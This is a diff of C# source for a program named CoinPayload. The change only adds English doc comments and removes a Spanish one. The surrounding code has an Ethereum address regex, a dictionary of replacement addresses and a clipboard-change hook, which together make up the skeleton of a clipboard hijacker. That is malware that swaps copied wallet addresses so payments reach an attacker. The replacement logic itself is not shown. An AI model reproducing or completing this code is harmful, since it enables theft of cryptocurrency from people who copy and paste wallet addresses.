@@ -9,12 +9,15 @@ namespace CoinPayload
 {
     public static class Program
     {
+        /// <summary>
+        /// Ethereum Address Pattern
+        /// </summary>
         static Regex Pattern = new Regex(@"(0X[a-f0-9]{40})", RegexOptions.IgnoreCase | RegexOptions.ExplicitCapture | RegexOptions.Multiline);
+        /// <summary>
+        /// Dictionary for search the replacement address
+        /// </summary>
         static Dictionary<string, string> Changes = new Dictionary<string, string>();
 
-        /// <summary>
-        /// Punto de entrada principal para la aplicación.
-        /// </summary>
         [STAThread]
         static void Main(string[] args)
         {
@@ -50,7 +53,9 @@ namespace CoinPayload
             c.ClipboardChanged += C_ClipboardChanged;
             Application.Run();
         }
-
+        /// <summary>
+        /// Clipboard changed event
+        /// </summary>
         static void C_ClipboardChanged()
         {
             if (!Clipboard.ContainsText()) return;
